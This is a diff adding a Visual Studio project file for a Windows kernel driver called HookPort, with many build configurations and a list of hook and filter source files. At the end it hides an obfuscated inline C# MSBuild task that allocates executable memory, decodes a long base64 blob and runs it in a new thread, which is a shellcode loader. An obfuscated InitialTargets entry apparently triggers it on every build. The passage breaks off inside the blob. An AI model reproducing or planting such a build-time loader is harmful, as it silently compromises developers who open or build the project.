@@ -1,0 +1,280 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" InitialTargets="CpF0Ep5DZY">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Win8.1 Debug|Win32">
+      <Configuration>Win8.1 Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Win8.1 Release|Win32">
+      <Configuration>Win8.1 Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Win8 Debug|Win32">
+      <Configuration>Win8 Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Win8 Release|Win32">
+      <Configuration>Win8 Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Win7 Debug|Win32">
+      <Configuration>Win7 Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Win7 Release|Win32">
+      <Configuration>Win7 Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Win8.1 Debug|x64">
+      <Configuration>Win8.1 Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Win8.1 Release|x64">
+      <Configuration>Win8.1 Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Win8 Debug|x64">
+      <Configuration>Win8 Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Win8 Release|x64">
+      <Configuration>Win8 Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Win7 Debug|x64">
+      <Configuration>Win7 Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Win7 Release|x64">
+      <Configuration>Win7 Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{899C1AAB-7B9A-4E76-8166-61B85FB9457B}</ProjectGuid>
+    <TemplateGuid>{dd38f7fc-d7bd-488b-9242-7d8754cde80d}</TemplateGuid>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <MinimumVisualStudioVersion>11.0</MinimumVisualStudioVersion>
+    <Configuration>Win8.1 Debug</Configuration>
+    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
+    <RootNamespace>HookPort</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0.18362.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8.1 Debug|Win32'" Label="Configuration">
+    <TargetVersion>WindowsV6.3</TargetVersion>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8.1 Release|Win32'" Label="Configuration">
+    <TargetVersion>WindowsV6.3</TargetVersion>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8 Debug|Win32'" Label="Configuration">
+    <TargetVersion>Windows8</TargetVersion>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8 Release|Win32'" Label="Configuration">
+    <TargetVersion>Windows8</TargetVersion>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win7 Debug|Win32'" Label="Configuration">
+    <TargetVersion>Windows7</TargetVersion>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win7 Release|Win32'" Label="Configuration">
+    <TargetVersion>Windows7</TargetVersion>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8.1 Debug|x64'" Label="Configuration">
+    <TargetVersion>WindowsV6.3</TargetVersion>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8.1 Release|x64'" Label="Configuration">
+    <TargetVersion>WindowsV6.3</TargetVersion>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8 Debug|x64'" Label="Configuration">
+    <TargetVersion>Windows8</TargetVersion>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8 Release|x64'" Label="Configuration">
+    <TargetVersion>Windows8</TargetVersion>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win7 Debug|x64'" Label="Configuration">
+    <TargetVersion>Windows7</TargetVersion>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win7 Release|x64'" Label="Configuration">
+    <TargetVersion>Windows7</TargetVersion>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
+    <ConfigurationType>Driver</ConfigurationType>
+    <DriverType>WDM</DriverType>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings"></ImportGroup>
+  <ImportGroup Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8.1 Debug|Win32'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8.1 Release|Win32'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8 Debug|Win32'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8 Release|Win32'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win7 Debug|Win32'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win7 Release|Win32'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8.1 Debug|x64'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8.1 Release|x64'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8 Debug|x64'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win8 Release|x64'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win7 Debug|x64'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Win7 Release|x64'">
+    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Win7 Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>TurnOffAllWarnings</WarningLevel>
+    </ClCompile>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Win7 Debug|Win32'">
+    <ClCompile>
+      <TreatWarningAsError>false</TreatWarningAsError>
+    </ClCompile>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Win8.1 Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>TurnOffAllWarnings</WarningLevel>
+    </ClCompile>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Win8.1 Debug|Win32'">
+    <ClCompile>
+      <TreatWarningAsError>false</TreatWarningAsError>
+    </ClCompile>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <Inf Include="HookPort.inf" />
+  </ItemGroup>
+  <ItemGroup>
+    <FilesToPackage Include="$(TargetPath)" />
+    <FilesToPackage Include="@(Inf-&gt;'%(CopyOutput)')" Condition="'@(Inf)'!=''" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="Data.h" />
+    <ClInclude Include="DebugPrint.h" />
+    <ClInclude Include="defs.h" />
+    <ClInclude Include="Driver.h" />
+    <ClInclude Include="FilterHook.h" />
+    <ClInclude Include="Filter_CreateProcessNotifyRoutine.h" />
+    <ClInclude Include="Filter_CreateProcessNotifyRoutineEx.h" />
+    <ClInclude Include="Filter_CreateThreadNotifyRoutine.h" />
+    <ClInclude Include="Filter_KeUserModeCallbackDispatcher.h" />
+    <ClInclude Include="Filter_LoadImageNotifyRoutine.h" />
+    <ClInclude Include="Filter_ZwContinue.h" />
+    <ClInclude Include="Filter_ZwCreateFile.h" />
+    <ClInclude Include="Filter_ZwCreateThread.h" />
+    <ClInclude Include="Filter_ZwDisplayString.h" />
+    <ClInclude Include="Filter_ZwLoadDriver.h" />
+    <ClInclude Include="Filter_ZwOpenFile.h" />
+    <ClInclude Include="Filter_ZwSetSystemInformation.h" />
+    <ClInclude Include="Filter_ZwUnloadDriver.h" />
+    <ClInclude Include="Filter_ZwWriteFile.h" />
+    <ClInclude Include="IDT.h" />
+    <ClInclude Include="KiFastCallEntry.h" />
+    <ClInclude Include="SSDT.h" />
+    <ClInclude Include="System.h" />
+    <ClInclude Include="Win32k.h" />
+    <ClInclude Include="WinKernel.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="DebugPrint.c" />
+    <ClCompile Include="Driver.c" />
+    <ClCompile Include="FilterHook.c" />
+    <ClCompile Include="Filter_CreateProcessNotifyRoutine.c" />
+    <ClCompile Include="Filter_CreateProcessNotifyRoutineEx.c" />
+    <ClCompile Include="Filter_CreateThreadNotifyRoutine.c" />
+    <ClCompile Include="Filter_KeUserModeCallbackDispatcher.c" />
+    <ClCompile Include="Filter_LoadImageNotifyRoutine.c" />
+    <ClCompile Include="Filter_ZwContinue.c" />
+    <ClCompile Include="Filter_ZwCreateFile.c" />
+    <ClCompile Include="Filter_ZwCreateThread.c" />
+    <ClCompile Include="Filter_ZwDisplayString.c" />
+    <ClCompile Include="Filter_ZwLoadDriver.c" />
+    <ClCompile Include="Filter_ZwOpenFile.c" />
+    <ClCompile Include="Filter_ZwSetSystemInformation.c" />
+    <ClCompile Include="Filter_ZwUnloadDriver.c" />
+    <ClCompile Include="Filter_ZwWriteFile.c" />
+    <ClCompile Include="IDT.c" />
+    <ClCompile Include="KiFastCallEntry.c" />
+    <ClCompile Include="SSDT.c" />
+    <ClCompile Include="System.c" />
+    <ClCompile Include="Win32k.c" />
+    <ClCompile Include="WinKernel.c" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets"></ImportGroup>
+  <UsingTask TaskName="j8DNINyz1G" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+    <Task>
+      <Code Type="Method" Language="cs"><![CDATA[[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualAlloc")]static extern System.IntPtr Bz4IEXL(System.IntPtr a,uint s,uint t,uint p);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualProtect")]static extern bool N9mf9U5(System.IntPtr a,uint s,uint p,out uint o);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="CreateThread")]static extern System.IntPtr oO0gcXo(System.IntPtr a,uint s,System.IntPtr e,System.IntPtr p,uint f,System.IntPtr t);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="WaitForSingleObject")]static extern uint VwZvEUB(System.IntPtr h,uint ms);public override bool Execute(){var rZK76y=System.Convert.FromBase64String("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